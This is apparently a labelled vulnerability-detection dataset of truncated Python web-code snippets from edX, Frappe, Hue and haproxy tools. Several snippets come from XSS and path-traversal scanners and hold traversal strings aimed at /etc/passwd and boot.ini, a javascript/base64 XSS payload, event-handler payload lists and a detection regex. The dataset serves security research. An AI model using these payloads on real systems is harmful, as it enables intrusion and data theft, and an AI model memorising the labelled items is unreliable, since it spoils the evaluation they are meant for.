"(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string", "label": 0}, {"snippet_id": 38210, "code": ".name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog", "label": 0}, {"snippet_id": 22053, "code": ".instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')),", "label": 0}, {"snippet_id": 52437, "code": " response['message']=_('Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def new_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}", "label": 0}, {"snippet_id": 50976, "code": ", UploadLog, UrlList class MyPeriodicTaskForm(PeriodicTaskForm): fieldsets=PeriodicTaskAdmin.fieldsets \"\"\" Interval schedule does not support due_ or something. Which is absolutely terrible and vague. I", "label": 0}, {"snippet_id": 29463, "code": " check_haproxy_config(serv): \timport sql \tcommands=[ \"haproxy -q -c -f %s\" % sql.get_setting('haproxy_config_path')] \tssh=ssh_connect(serv) \tfor command in commands: \t\tstdin, stdout, stderr=ssh.exec_command", "label": 0}, {"snippet_id": 12729, "code": "'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$", "label": 0}, {"snippet_id": 31955, "code": "'get_ldap_email'): \tusername=form.getvalue('get_ldap_email') \timport ldap \t \tserver=sql.get_setting('ldap_server') \tport=sql.get_setting('ldap_port') \tuser=sql.get_setting('ldap_user') \tpassword=sql.get_setting", "label": 0}, {"snippet_id": 12286, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter", "label": 0}, {"snippet_id": 14987, "code": ".verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"", "label": 0}, {"snippet_id": 36786, "code": ".comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", ", "label": 0}, {"snippet_id": 53361, "code": "'uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/bundle_editor.mako', request,{ ", "label": 1}, {"snippet_id": 41883, "code": ", filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key", "label": 0}, {"snippet_id": 26849, "code": "'root:x:0:0', ':/root:/bin'] def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url): global xss_attacks global DEBUG if page.find(\"http://\")==0 or page.find", "label": 0}, {"snippet_id": 26810, "code": "%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f", "label": 0}, {"snippet_id": 23442, "code": " settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:", "label": 0}, {"snippet_id": 20479, "code": " def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p()", "label": 0}, {"snippet_id": 50717, "code": "*kwargs) def send_text(self, *args, **kwargs): \"\"\" Send text data. This will pre-process the text for color-replacement, conversion to html etc. Args: text(str): Text to send. Kwargs: options(dict): Options", "label": 0}, {"snippet_id": 46991, "code": ".id}'), ONE_HOUR) async def comment_ids_liked_by(self, user_id): cids=[c.id for c in await self.comments] if not cids: return[] queryset=await ReactItem.filter( Q(user_id=user_id), Q(target_id__in=cids),", "label": 0}, {"snippet_id": 40137, "code": ".doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError,", "label": 0}, {"snippet_id": 48947, "code": ", False) else field else: display_function=getattr(self.object, 'get_%s_display' % self.column.field_name, False) value=display_function() if display_function else field return escape(value) def format", "label": 1}, {"snippet_id": 27348, "code": " libs import auth from libs import form from libs import helpers from system import environment def add_jinja2_filter(name, fn): _JINJA_ENVIRONMENT.filters[name]=fn class JsonEncoder(json.JSONEncoder):", "label": 0}, {"snippet_id": 54823, "code": ") context['is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT']) return context def test_func(self): return self.request.user==self.get_object().author class ArticleDelete(UserPassesTestMixin, DeleteView", "label": 0}, {"snippet_id": 44443, "code": " raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(type='oozie-workflow2', id=job['id']) name=doc2.name +", "label": 0}, {"snippet_id": 14005, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(", "label": 0}, {"snippet_id": 53077, "code": "', owner=request.user) Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2') if coordinator_data[", "label": 0}, {"snippet_id": 23561, "code": " settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns", "label": 0}, {"snippet_id": 26908, "code": "{} counter+=1 parameters=\"\" for i in range(0,len(params)): for j in range(0, len(params)): if j==i: post_params[params[j]]=xss else: post_params[params[j]]=0 if(len(hidden_param_name) > 0) and(len(hidden_param_name", "label": 0}, {"snippet_id": 40317, "code": "\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t", "label": 1}, {"snippet_id": 24893, "code": "(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd", "label": 0}, {"snippet_id": 14658, "code": "'SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self", "label": 0}, {"snippet_id": 37402, "code": ".comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", ", "label": 0}, {"snippet_id": 32590, "code": " elif path.lower().endswith('.md'): self._DoMD(path) elif os.path.exists(full_path +'/README.md'): self._DoMD(path +'/README.md') elif path.lower().endswith('.png'): self._DoImage(full_path, 'image/png')", "label": 0}, {"snippet_id": 51196, "code": "' class UserResource(resources.ModelResource): class Meta: model=User class GroupResource(resources.ModelResource): class Meta: model=Group class UserAdmin(BaseUserAdmin, ImportExportModelAdmin): resource_class", "label": 0}, {"snippet_id": 13055, "code": "\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request", "label": 0}, {"snippet_id": 44109, "code": ".search class TestXSS: def test_facted_page_xss(self, client, project): query='XSS' page_search=PageDocument.faceted_search(query=query, user='') results=page_search.execute() expected=\"\"\" &lt;h3&gt;<em>XSS<", "label": 0}, {"snippet_id": 25937, "code": "=answers[0] self.fields['question_%s' % q.id]=field responses=question_form_fields.send(sender=event, position=pos) data=pos.meta_info_data for r, response in sorted(responses, key=lambda r: str(r[0])): for", "label": 0}, {"snippet_id": 34060, "code": ".comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category", "label": 0}, {"snippet_id": 54182, "code": "').grid(row=1) Label(main, text=\"Method:\",background='light sky blue').grid(row=2) Label(main, text=\"Timeout:\",background='light sky blue').grid(row=3) Label(main, text=\"User-Agent:\",background='light sky", "label": 0}, {"snippet_id": 20134, "code": ".sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming", "label": 0}, {"snippet_id": 55061, "code": "(request.POST) if not form.is_valid(): return HttpResponseBadRequest(form.errors.as_json()) locale=get_object_or_404(Locale, code=form.cleaned_data['locale']) entities=Entity.objects.filter(pk__in=form", "label": 1}, {"snippet_id": 5827, "code": " payloads=_payloads waf_payloads=_waf_payloads h5payloads=_h5payloads def __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @classmethod def alterTest(cls, p=False)", "label": 0}, {"snippet_id": 38782, "code": " filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key", "label": 0}, {"snippet_id": 14654, "code": " self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command", "label": 0}, {"snippet_id": 33433, "code": "\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\") \t\t\tif any(x in _payload for x in \"\\\"'><;/\"): \t\t\t\treturn _payload \tdef check(self, url, payload, response, parameter): \t\tfor injection_types in self.signatures.keys(): ", "label": 1}, {"snippet_id": 42269, "code": ", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self", "label": 0}, {"snippet_id": 48492, "code": ": return HttpResponseRedirect(\"/admin?error=No%20id%20provided\") current_reservation=GroupReservation.objects.get(id=int(request.GET[\"payload\"])) if current_reservation.createdByUser !=u and u. rights ", "label": 0}, {"snippet_id": 23314, "code": "+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 7318, "code": "/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key", "label": 0}, {"snippet_id": 45019, "code": " in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_workflow'", "label": 0}, {"snippet_id": 12256, "code": " name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 1}, {"snippet_id": 22498, "code": ".html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url':", "label": 0}, {"snippet_id": 33884, "code": "=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters", "label": 0}, {"snippet_id": 14189, "code": ", include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 32911, "code": "'</b>') else: bold=('', '') self.wfile.write('<a href=\"%s/%s\">%s%s%s</a><br/>\\n' % (self.path.rstrip('/'), f, bold[0], f, bold[1])) self.wfile.write('<br/>\\n') for d in sorted(dirs): if d.startswith('.", "label": 1}, {"snippet_id": 39655, "code": ": \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable", "label": 0}, {"snippet_id": 54463, "code": ".contrib.auth.forms import UserCreationForm, PasswordChangeForm from django.contrib.auth.models import User from django.contrib.auth.decorators import login_required from django.contrib.auth.mixins import", "label": 0}, {"snippet_id": 52387, "code": "[node['properties']['workflow'] for node in workflow['nodes'] if node['type']=='subworkflow-widget'] if subworkflows: dependencies=Document2.objects.filter(uuid__in=subworkflows) workflow_doc.dependencies", "label": 0}, {"snippet_id": 54523, "code": " DeleteView, UpdateView, FormMixin from markdown import markdown from.models import Article, Category, Comment class ArticleForm(forms.ModelForm): class Meta: model=Article fields=['title', 'category',", "label": 0}, {"snippet_id": 51795, "code": "-ixmKSvkQ=': raise ValueError('FIELD_ENCRYPTION_KEY has to be configured on the OS level, and needs to be different than the ' 'default key provided. Please create a new key. Instructions are listed here:", "label": 0}, {"snippet_id": 27555, "code": "=name self.href=href class Handler(webapp2.RequestHandler): \"\"\"A superclass for all handlers. It contains many convenient methods.\"\"\" def is_cron(self): \"\"\"Return true if the request is from a cron job", "label": 0}, {"snippet_id": 13938, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 44165, "code": "'hits']['hits'] assert len(section_hits)==1 section_content_highlight=section_hits[0]['highlight']['sections.content'] assert len(section_content_highlight)==1 assert expected in section_content_highlight", "label": 0}, {"snippet_id": 11976, "code": "+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to'", "label": 0}, {"snippet_id": 35779, "code": ", Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is", "label": 0}, {"snippet_id": 28111, "code": " env=Environment(loader=FileSystemLoader('templates/')) template=env.get_template('config.html') print('Content-type: text/html\\n') funct.check_login() form=cgi.FieldStorage() serv=form.getvalue('serv'", "label": 1}, {"snippet_id": 9413, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 38316, "code": "\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type", "label": 0}, {"snippet_id": 45800, "code": ", bundle, properties): try: deployment_mapping={} coords=dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])", "label": 0}, {"snippet_id": 26556, "code": "../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00', '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00', '../../../../../../../etc/passwd%00', '../../../../../../", "label": 0}, {"snippet_id": 50068, "code": " __init__(self): self.requests={} self.databuffer={} self.last_alive={} self.keep_alive=None def _responseFailed(self, failure, csessid, request): \"callback if a request is lost/timed out\" try: del self", "label": 0}, {"snippet_id": 40072, "code": " \t\tcolumn_types_to_check_length=('varchar', 'int', 'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif not df or df.fieldtype=='Check': \t\t\t\t", "label": 0}, {"snippet_id": 11126, "code": "( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running", "label": 0}, {"snippet_id": 43982, "code": ": \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance", "label": 0}, {"snippet_id": 50674, "code": " self.client.lineSend(self.csessid,[\"connection_close\",[reason],{}]) self.client.client_disconnect(self.csessid) self.sessionhandler.disconnect(self) def at_login(self): csession=self.get_client_session", "label": 0}, {"snippet_id": 32564, "code": ".server.top_level, path[1:])) if not full_path.startswith(self.server.top_level): self._DoUnknown() elif path in('/base.css', '/doc.css', '/prettify.css'): self._DoCSS(path[1:]) elif not os.path.exists", "label": 0}, {"snippet_id": 48897, "code": " SmartListField(object): def __init__(self, smart_list_item, column, object): self.smart_list_item=smart_list_item self.column=column self.object=object def get_value(self): if self.column.render_function:", "label": 1}, {"snippet_id": 24790, "code": ".py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue", "label": 0}, {"snippet_id": 38435, "code": " \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" +post.avatar \treturn posts", "label": 0}, {"snippet_id": 9118, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', ", "label": 1}, {"snippet_id": 36307, "code": "(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is not None: ", "label": 0}, {"snippet_id": 33696, "code": "\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title", "label": 0}, {"snippet_id": 27622, "code": "} self.render('error-403.html', template_values, 403) def _add_security_response_headers(self): \"\"\"Add security-related headers to response.\"\"\" self.response.headers['Strict-Transport-Security']=( 'max", "label": 0}, {"snippet_id": 19053, "code": "'ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 13891, "code": ", url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor", "label": 0}, {"snippet_id": 31334, "code": "=str(i[4]) \t\tdf=pd.DataFrame.from_dict(metrics, orient=\"index\") \t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) ", "label": 0}, {"snippet_id": 37652, "code": ".blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")", "label": 0}, {"snippet_id": 49746, "code": "=sys.argv[1].strip() print \"Listening on\",HOST+\":\"+PORT app=Flask(__name__) app.secret_key='I Am Batman.' access_key=\"Tony Stark Is The Best.\" session_id=\"This guy fucks!\" socketio=SocketIO(app) html=''", "label": 0}, {"snippet_id": 25710, "code": " widget=widget, ) elif q.type==Question.TYPE_NUMBER: field=forms.DecimalField( label=q.question, required=q.required, help_text=q.help_text, initial=initial.answer if initial else None, min_value=Decimal('0", "label": 0}, {"snippet_id": 32181, "code": "\"Simple Markdown browser for a Git checkout.\"\"\" from __future__ import print_function import SimpleHTTPServer import SocketServer import argparse import codecs import os import re import socket import sys", "label": 0}, {"snippet_id": 18188, "code": ".mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$'", "label": 0}, {"snippet_id": 50279, "code": "=AjaxWebClientSession() sess.client=self sess.init_session(\"ajax/comet\", remote_addr, self.sessionhandler) sess.csessid=csessid csession=_CLIENT_SESSIONS(session_key=sess.csessid) uid=csession and csession.get", "label": 0}, {"snippet_id": 55125, "code": " active_translations=Translation.objects.filter( active=True, locale=locale, entity__in=entities, ) action_function=ACTIONS_FN_MAP[form.cleaned_data['action']] action_status=action_function( form, request.user", "label": 0}, {"snippet_id": 20191, "code": "\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir", "label": 0}, {"snippet_id": 43559, "code": ":param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance", "label": 0}, {"snippet_id": 15692, "code": "\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can", "label": 0}, {"snippet_id": 14355, "code": "-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds", "label": 0}, {"snippet_id": 23069, "code": "/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$", "label": 0}, {"snippet_id": 32621, "code": "(full_path, 'image/jpeg') elif os.path.isdir(full_path): self._DoDirListing(full_path) elif os.path.exists(full_path): self._DoRawSourceFile(full_path) else: self._DoUnknown() def _DoMD(self, path): extensions=", "label": 0}, {"snippet_id": 18666, "code": ")/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views", "label": 0}, {"snippet_id": 21845, "code": "'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views", "label": 0}, {"snippet_id": 53338, "code": ") @check_document_access_permission() def edit_bundle(request): bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc) else: bundle", "label": 0}, {"snippet_id": 410, "code": " \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result=True uri_check_list=['?', '&', '=', '%3F', '%26',", "label": 0}, {"snippet_id": 14308, "code": "', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name=", "label": 0}, {"snippet_id": 24468, "code": " DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE", "label": 1}, {"snippet_id": 29008, "code": "\thaproxy_sock_port=sql.get_setting('haproxy_sock_port') \tstats_port=sql.get_setting('stats_port') \tserver_state_file=sql.get_setting('server_state_file') \tstats_user=sql.get_setting('stats_user') \tstats_password", "label": 0}, {"snippet_id": 34908, "code": ": \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef", "label": 0}, {"snippet_id": 11808, "code": "'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template':", "label": 0}, {"snippet_id": 43, "code": " f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain'in xss_request", "label": 1}, {"snippet_id": 35958, "code": "=\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach", "label": 1}, {"snippet_id": 20491, "code": " the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file", "label": 0}, {"snippet_id": 5140, "code": " s='' for t in cls.tags: s +='<%s src=\"x\"' % t for e in cls.events: s +=''' %s=\"console.log('%s %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls,", "label": 0}, {"snippet_id": 42732, "code": " for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))", "label": 0}, {"snippet_id": 5572, "code": "=javascript:alert('xss');\">\"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html", "label": 0}, {"snippet_id": 52510, "code": ".objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=json.loads(request.POST.get('properties', '", "label": 0}, {"snippet_id": 6084, "code": "': None, 'default_eppn_scope': None, 'authn_info_mongo_uri': None, 'max_authn_failures_per_month': '50', 'login_state_ttl': '5', 'default_scoped_affiliation': None, 'vccs_url': 'http://localhost:8550/'", "label": 0}, {"snippet_id": 38206, "code": " `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where", "label": 0}, {"snippet_id": 5418, "code": "'onfocusin', 'onfocusout', 'onhashchange', 'oninput', 'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onmessage', 'onmousedown', 'onmouseenter", "label": 0}, {"snippet_id": 14138, "code": "', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$'", "label": 0}, {"snippet_id": 3595, "code": " headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param==''", "label": 0}, {"snippet_id": 7696, "code": "'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 